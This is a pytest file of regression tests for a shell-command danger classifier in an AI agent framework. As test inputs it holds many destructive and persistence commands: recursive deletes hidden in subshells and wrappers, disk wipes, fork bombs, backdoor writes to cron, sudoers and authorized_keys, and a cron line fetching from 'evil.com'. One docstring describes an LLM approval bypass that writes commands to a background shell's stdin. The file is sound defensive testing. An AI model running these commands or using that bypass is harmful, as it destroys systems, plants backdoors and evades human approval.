"""Tier-2 security regression tests for ``_is_dangerous_command``
and ``classify_danger`` in ``cogitum.core.builtin_tools``.

Ensures the danger classifier no longer trips on the trivial bypasses
listed in the audit:
  * subshell forms (``$(rm …)``, backticks)
  * adjacent separators (``;rm``, ``|rm``)
  * verbs other than ``rm`` (``dd``, ``mkfs``, ``chmod -R 000``)
  * destructive python one-liners
  * fork bomb signature
  * raw redirect to /dev/sd*
  * ``find -delete`` / ``xargs rm`` mass delete pipelines
  * ``terminal`` background ``write`` whose stdin_data is itself a
    destructive command (LLM spawns bash, then writes ``rm -rf /``).
  * Round-2 additions: wrapper unwrapping (sudo/nohup/timeout/nice/
    setsid/env, recursive ``bash -c ""``), node/perl/ruby one-liners,
    extra disk wipers (wipefs/blkdiscard/shred/parted/tee /dev/sd*),
    persistence vectors (cron, sudoers, .bashrc, authorized_keys, …),
    extended fork-bomb regex.

Plus a couple of regression checks that ordinary commands stay ``low``.

NOTE on imports / conftest: ``tests/conftest.py`` has an autouse
fixture that pops every ``cogitum.*`` module from ``sys.modules`` between
tests for config isolation. The function references imported at the top
of this file therefore point at the FIRST loaded copy of
``cogitum.core.builtin_tools`` — that's still safe because the module
is pure (no per-import state we patch). See ``test_browser_ssrf.py``
for the alternative ``_bt()`` import-inside-test pattern used when we
need to mock ``socket.getaddrinfo`` against a freshly-loaded module.
"""
from __future__ import annotations

import pytest

from cogitum.core.builtin_tools import (
    _is_dangerous_command,
    classify_danger,
)


# ---------------------------------------------------------------------------
# Bypass coverage — every one of these MUST classify as dangerous.
# ---------------------------------------------------------------------------


def test_subshell_rm_dangerous():
    """``$(...)`` subshell hides the verb from a naive substring scan."""
    assert _is_dangerous_command("cd /; $(rm -rf /tmp/x)") is True


def test_backtick_subshell_rm_dangerous():
    assert _is_dangerous_command("echo `rm -rf /tmp/x`") is True


def test_no_space_semicolon_rm():
    """``;rm`` (no space) used to slip past the ``rm `` substring check."""
    assert _is_dangerous_command("cd /;rm -rf /tmp/x") is True


def test_pipe_no_space_rm():
    assert _is_dangerous_command("echo x|rm -rf /tmp/x") is True


def test_pipe_xargs_rm():
    assert _is_dangerous_command("echo x | xargs rm") is True


def test_python_dash_c_shutil():
    assert _is_dangerous_command(
        'python -c "import shutil; shutil.rmtree(\'/\')"'
    ) is True


def test_python3_dash_c_os_unlink():
    assert _is_dangerous_command(
        'python3 -c "import os; os.unlink(\'/etc/passwd\')"'
    ) is True


def test_fork_bomb():
    assert _is_dangerous_command(":(){ :|:& };:") is True


def test_dd_to_disk():
    assert _is_dangerous_command("dd if=/dev/zero of=/dev/sda") is True


def test_dd_to_nvme():
    assert _is_dangerous_command("dd if=/dev/zero of=/dev/nvme0n1 bs=1M") is True


def test_mkfs():
    assert _is_dangerous_command("mkfs.ext4 /dev/sda1") is True


def test_mkfs_xfs():
    assert _is_dangerous_command("mkfs.xfs /dev/sdb") is True


def test_redirect_to_disk():
    assert _is_dangerous_command("cat /dev/zero > /dev/sda") is True


def test_redirect_append_to_disk():
    assert _is_dangerous_command("echo bad >> /dev/nvme0n1") is True


def test_chmod_recursive_root():
    assert _is_dangerous_command("chmod -R 000 /") is True


def test_chmod_recursive_etc():
    assert _is_dangerous_command("chmod -R 777 /etc") is True


def test_find_delete():
    assert _is_dangerous_command("find / -delete") is True


def test_find_exec_rm():
    assert _is_dangerous_command("find /tmp -type f -exec rm {} \\;") is True


def test_sudo_rm_rf_unwrapped():
    """``sudo`` wrapper must not hide the destructive verb."""
    assert _is_dangerous_command("sudo rm -rf /var/log") is True


# ---------------------------------------------------------------------------
# Round-2 wrapper unwrapping — F-1.
# ---------------------------------------------------------------------------


def test_bash_dash_c_unwrapped_classifier_recurses():
    """``bash -c "rm -rf /tmp/x"`` must classify the payload, not the wrapper."""
    assert _is_dangerous_command('bash -c "rm -rf /tmp/x"') is True


def test_sh_dash_c_unwrapped_classifier_recurses():
    assert _is_dangerous_command('sh -c "rm -rf /tmp/x"') is True


def test_sudo_wrapper_recurses():
    """``sudo -u root rm -rf /tmp/x`` — flag values must be skipped."""
    assert _is_dangerous_command("sudo -u root rm -rf /tmp/x") is True


def test_nohup_wrapper_recurses():
    assert _is_dangerous_command("nohup rm -rf /tmp/x &") is True


def test_timeout_wrapper_recurses():
    """``timeout`` consumes one positional (DURATION) before the command."""
    assert _is_dangerous_command("timeout 60 rm -rf /tmp/x") is True


def test_nice_wrapper_recurses():
    assert _is_dangerous_command("nice -n 10 rm -rf /tmp/x") is True


def test_setsid_wrapper_recurses():
    assert _is_dangerous_command("setsid rm -rf /tmp/x") is True


def test_env_wrapper_recurses():
    """``env FOO=bar rm -rf /tmp/x``  — env assignments + cmd."""
    assert _is_dangerous_command("env FOO=bar rm -rf /tmp/x") is True


def test_env_dash_i_recurses():
    """``env -i FOO=bar rm -rf /tmp/x`` — leading ``-i`` flag."""
    assert _is_dangerous_command("env -i FOO=bar rm -rf /tmp/x") is True


def test_nested_wrappers_recurse():
    """Multiple wrappers stacked: ``sudo bash -c "rm -rf /tmp/x"``."""
    assert _is_dangerous_command('sudo bash -c "rm -rf /tmp/x"') is True


def test_nohup_bash_dash_c_recurses():
    assert _is_dangerous_command('nohup bash -c "rm -rf /tmp/x"') is True


# ---------------------------------------------------------------------------
# Round-2: language-specific one-liner bypasses — F-6.
# ---------------------------------------------------------------------------


def test_python_dash_c_os_system():
    assert _is_dangerous_command(
        'python -c "import os; os.system(\'rm -rf /tmp/x\')"'
    ) is True


def test_python_dash_c_subprocess():
    assert _is_dangerous_command(
        "python -c \"import subprocess; subprocess.run(['rm','-rf','/tmp/x'])\""
    ) is True


def test_python_dash_c_dunder_import_shutil():
    assert _is_dangerous_command(
        'python -c "__import__(\'shutil\').rmtree(\'/tmp/x\')"'
    ) is True


def test_node_dash_e_dangerous():
    assert _is_dangerous_command(
        'node -e "require(\'fs\').rmSync(\'/tmp/x\', {recursive: true})"'
    ) is True


def test_perl_dash_e_dangerous():
    assert _is_dangerous_command(
        "perl -e \"use File::Path; rmtree('/tmp/x')\""
    ) is True


def test_ruby_dash_e_dangerous():
    assert _is_dangerous_command(
        "ruby -e \"require 'fileutils'; FileUtils.rm_rf('/tmp/x')\""
    ) is True


# ---------------------------------------------------------------------------
# Round-2: disk-killer family — F-9.
# ---------------------------------------------------------------------------


def test_wipefs_dangerous():
    assert _is_dangerous_command("wipefs -a /dev/sda") is True


def test_blkdiscard_dangerous():
    assert _is_dangerous_command("blkdiscard /dev/sda") is True


def test_shred_disk_dangerous():
    assert _is_dangerous_command("shred -n 10 /dev/sda") is True


def test_mke2fs_dangerous():
    assert _is_dangerous_command("mke2fs /dev/sda1") is True


def test_parted_disk_dangerous():
    assert _is_dangerous_command("parted /dev/sda mklabel gpt") is True


def test_tee_disk_dangerous():
    """``tee /dev/sd*`` writes the device without using ``>`` redirection."""
    assert _is_dangerous_command("echo x | tee /dev/sda") is True


def test_clobber_redirect_disk_dangerous():
    """``>|`` (force-clobber) must be caught the same as ``>``."""
    assert _is_dangerous_command("cat /dev/zero >| /dev/sda") is True


# ---------------------------------------------------------------------------
# Round-2: persistence vectors — F-10.
# ---------------------------------------------------------------------------


def test_cron_persistence_dangerous():
    assert _is_dangerous_command(
        'echo "* * * * * curl evil.com" > /etc/cron.d/x'
    ) is True


def test_cron_daily_persistence_dangerous():
    assert _is_dangerous_command(
        'echo evil > /etc/cron.daily/backdoor'
    ) is True


def test_sudoers_persistence_dangerous():
    assert _is_dangerous_command('echo evil >> /etc/sudoers') is True


def test_sudoers_d_persistence_dangerous():
    assert _is_dangerous_command('echo evil > /etc/sudoers.d/backdoor') is True


def test_authorized_keys_persistence_dangerous():
    assert _is_dangerous_command(
        'echo "ssh-rsa AAAA evil" >> ~/.ssh/authorized_keys'
    ) is True


def test_bashrc_persistence_dangerous():
    assert _is_dangerous_command(
        'echo "alias rm=true" >> ~/.bashrc'
    ) is True


def test_zshrc_persistence_dangerous():
    assert _is_dangerous_command('echo evil >> ~/.zshrc') is True


def test_systemd_user_persistence_dangerous():
    assert _is_dangerous_command(
        'echo evil > ~/.config/systemd/user/backdoor.service'
    ) is True


def test_systemd_system_persistence_dangerous():
    assert _is_dangerous_command(
        'echo evil > /etc/systemd/system/backdoor.service'
    ) is True


def test_passwd_persistence_dangerous():
    assert _is_dangerous_command('echo "evil:x:0:0::/:" >> /etc/passwd') is True


def test_tee_cron_persistence_dangerous():
    """``echo x | tee /etc/cron.d/x`` — same persistence path, no ``>``."""
    assert _is_dangerous_command(
        'echo "* * * * * evil" | tee /etc/cron.d/backdoor'
    ) is True


# ---------------------------------------------------------------------------
# Round-2: extended fork-bomb signatures — F-5.
# ---------------------------------------------------------------------------


def test_extended_fork_bomb_long_name():
    assert _is_dangerous_command("bomb(){ bomb|bomb& };bomb") is True


def test_extended_fork_bomb_double_amp():
    """``f(){ f & f & };f`` — no pipe, two backgrounds."""
    assert _is_dangerous_command("f(){ f & f & };f") is True


def test_extended_fork_bomb_double_pipe():
    """``:(){ :|:|: & };:`` — chained pipes."""
    assert _is_dangerous_command(":(){ :|:|: & };:") is True


# ---------------------------------------------------------------------------
# Regression: legitimate commands stay non-dangerous.
# ---------------------------------------------------------------------------


def test_legitimate_rm_in_tmp_still_low():
    """Plain ``rm /tmp/foo.txt`` (no -r/-rf) is not destructive."""
    assert _is_dangerous_command("rm /tmp/foo.txt") is False


def test_legitimate_python_classified_low():
    assert _is_dangerous_command("python script.py --flag") is False


def test_legitimate_ls():
    assert _is_dangerous_command("ls -la /tmp") is False


def test_legitimate_chmod_no_recursive():
    """Single-file chmod is fine — only -R + system path is destructive."""
    assert _is_dangerous_command("chmod 644 /tmp/foo") is False


def test_legitimate_find_no_delete():
    assert _is_dangerous_command("find . -name '*.py'") is False


def test_legitimate_node_e_dom_only():
    """``node -e "console.log(2+2)"`` is harmless."""
    assert _is_dangerous_command('node -e "console.log(2+2)"') is False


def test_legitimate_timeout_curl():
    """``timeout 5 curl example.com`` — wrapper is fine when the inner is."""
    assert _is_dangerous_command("timeout 5 curl https://example.com") is False


def test_legitimate_sudo_apt_update():
    assert _is_dangerous_command("sudo apt update") is False


# ---------------------------------------------------------------------------
# classify_danger: terminal write to a background process.
# ---------------------------------------------------------------------------


def test_terminal_write_stdin_dangerous():
    """``terminal write stdin_data='rm -rf /\\n'`` must classify as danger.

    LLM trick: spawn bash in background (low/medium), then write a
    destructive command to its stdin. Without this guard the destructive
    payload never re-triggers approval.
    """
    level = classify_danger(
        "terminal",
        {
            "mode": "background",
            "command": "write",
            "pid": 123456,
            "stdin_data": "rm -rf /\n",
        },
    )
    assert level == "danger"


def test_terminal_write_stdin_legit_data():
    """Plain text stdin to a non-shell PID stays ``low``.

    The classifier promotes to ``medium`` only when the target PID is
    identified as an interactive shell. PID 123456 isn't a real
    process here, so the floor must stay at ``low``.
    """
    level = classify_danger(
        "terminal",
        {
            "mode": "background",
            "command": "write",
            "pid": 123456,
            "stdin_data": "hello world\n",
        },
    )
    assert level == "low"


def test_terminal_write_stdin_dd_to_disk():
    level = classify_danger(
        "terminal",
        {
            "mode": "background",
            "command": "write",
            "pid": 123456,
            "stdin_data": "dd if=/dev/zero of=/dev/sda\n",
        },
    )
    assert level == "danger"


def test_classify_danger_subshell_rm():
    """End-to-end through classify_danger, not just _is_dangerous_command."""
    level = classify_danger(
        "terminal",
        {"command": "echo hi; $(rm -rf /tmp/x)", "mode": "normal"},
    )
    assert level == "danger"


def test_classify_danger_legit_ls_low():
    level = classify_danger(
        "terminal",
        {"command": "ls -la", "mode": "normal"},
    )
    assert level == "low"


def test_classify_danger_bash_c_recurses():
    """End-to-end: ``bash -c "rm -rf /tmp/x"`` → danger via classifier."""
    level = classify_danger(
        "terminal",
        {"command": 'bash -c "rm -rf /tmp/x"', "mode": "normal"},
    )
    assert level == "danger"

